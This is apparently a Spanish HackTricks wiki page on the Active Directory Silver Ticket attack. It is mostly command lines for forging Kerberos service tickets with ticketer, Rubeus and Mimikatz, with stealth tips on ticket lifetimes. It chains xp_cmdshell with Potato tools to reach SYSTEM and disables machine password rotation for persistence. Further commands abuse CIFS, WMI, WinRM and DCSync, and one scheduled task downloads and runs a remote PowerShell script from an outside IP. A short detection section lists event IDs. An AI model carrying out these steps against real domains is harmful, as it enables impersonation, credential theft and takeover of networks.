# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

El ataque **Silver Ticket** implica la explotación de service tickets en entornos de Active Directory (AD). Este método se basa en **obtener el hash NTLM de una cuenta de servicio**, como una cuenta de equipo, para falsificar un ticket Ticket Granting Service (TGS). Con este ticket falsificado, un atacante puede acceder a servicios específicos de la red, **suplantando a cualquier usuario**, normalmente con el objetivo de obtener privilegios administrativos. Se destaca que usar claves AES para falsificar tickets es más seguro y menos detectable.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Los Silver Tickets son menos detectables que los Golden Tickets porque solo requieren el **hash de la cuenta de servicio**, no el de la cuenta krbtgt. Sin embargo, están limitados al servicio específico al que apuntan. Además, basta con robar la contraseña de un usuario.
Además, si comprometes la **contraseña de una cuenta con un SPN**, puedes usar esa contraseña para crear un Silver Ticket que suplante a cualquier usuario frente a ese servicio.

### Cambios modernos en Kerberos (dominios solo con AES)

- Las actualizaciones de Windows a partir del **8 de noviembre de 2022 (KB5021131)** establecen por defecto los service tickets con **claves de sesión AES** cuando es posible y están eliminando gradualmente RC4. Se espera que los DC se distribuyan con RC4 **deshabilitado por defecto a mediados de 2026**, por lo que depender de hashes NTLM/RC4 para Silver Tickets falla cada vez más con `KRB_AP_ERR_MODIFIED`. Extrae siempre las **claves AES** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) de la cuenta de servicio objetivo.<sup>[[5]](#references)</sup>
- Si `msDS-SupportedEncryptionTypes` de la cuenta de servicio está restringido a AES, debes falsificar usando `/aes256` o `-aesKey`; RC4 (`/rc4` o `-nthash`) no funcionará aunque tengas el hash NTLM.<sup>[[6]](#references)</sup>
- Las cuentas gMSA/de equipo rotan cada 30 días; extrae la **clave AES actual** de LSASS, Secretsdump/NTDS o DCsync antes de falsificar.
- OPSEC: la duración predeterminada de los tickets en las tools suele ser de **10 años**; establece duraciones realistas (por ejemplo, `-duration 600` minutos) para evitar la detección por duraciones anómalas.<sup>[[6]](#references)</sup>

Para la creación de tickets se utilizan distintas tools según el sistema operativo:

### En Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### En Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
El servicio CIFS se destaca como un objetivo común para acceder al sistema de archivos de la víctima, pero otros servicios como HOST y RPCSS también pueden explotarse para ejecutar tareas y realizar consultas WMI.

### Ejemplo: servicio MSSQL (MSSQLSvc) + Potato hasta SYSTEM

Si tienes el hash NTLM (o la clave AES) de una cuenta de servicio de SQL (por ejemplo, sqlsvc), puedes forjar un TGS para el SPN de MSSQL e impersonar a cualquier usuario en el servicio SQL. Desde ahí, habilita xp_cmdshell para ejecutar comandos como la cuenta de servicio de SQL. Si ese token tiene SeImpersonatePrivilege, encadena un Potato para elevar privilegios hasta SYSTEM.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Si el contexto resultante tiene SeImpersonatePrivilege (a menudo es así en las cuentas de servicio), usa una variante de Potato para obtener SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Más detalles sobre el abuso de MSSQL y la habilitación de xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Descripción general de las técnicas Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Servicios disponibles

| Tipo de servicio                           | Silver Tickets del servicio                                               |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Según el SO también:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones simplemente puedes solicitar: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, también psexec         | CIFS                                                                       |
| Operaciones LDAP, incluido DCSync          | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus**, puedes **solicitar todos** estos tickets mediante el parámetro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### IDs de eventos de Silver tickets

- 4624: Inicio de sesión de cuenta
- 4634: Cierre de sesión de cuenta
- 4672: Inicio de sesión de administrador
- **La ausencia de un 4768/4769 precedente en el DC** para el mismo cliente/servicio es un indicador común de que se ha presentado directamente al servicio un TGS falsificado.
- Una duración del ticket anormalmente larga o un tipo de cifrado inesperado (RC4 cuando el dominio exige AES) también destaca en los datos 4769/4624.

## Persistencia

Para evitar que las máquinas roten su contraseña cada 30 días, establece `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` o puedes establecer `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` en un valor superior a 30 días para indicar el periodo en el que debe rotarse la contraseña de las máquinas.<sup>[[3]](#references)</sup>

## Abuso de Service tickets

En los siguientes ejemplos, imaginemos que el ticket se obtiene suplantando la cuenta de administrador.

### CIFS

Con este ticket podrás acceder a las carpetas `C$` y `ADMIN$` mediante **SMB** (si están expuestas) y copiar archivos a una parte del sistema de archivos remoto haciendo simplemente algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
También podrás obtener un shell dentro del host o ejecutar comandos arbitrarios usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con este permiso puedes generar tareas programadas en equipos remotos y ejecutar comandos arbitrarios:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con estos tickets puedes **ejecutar WMI en el sistema víctima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encuentra **más información sobre wmiexec** en la siguiente página:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con acceso winrm a un equipo puedes **acceder a él** e incluso obtener una PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulta la siguiente página para conocer **más formas de conectarte a un host remoto mediante winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Ten en cuenta que **winrm debe estar activo y escuchando** en el equipo remoto para acceder a él.

### LDAP

Con este privilegio puedes volcar la base de datos del DC mediante **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Obtén más información sobre DCSync** en la siguiente página:


{{#ref}}
dcsync.md
{{#endref}}


## Referencias

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): ¿Cómo atacar Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Proceso de contraseña de la cuenta de máquina - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: ruta Silver Ticket + Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening y obsolescencia de RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Opciones actuales de Impacket ticketer.py (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
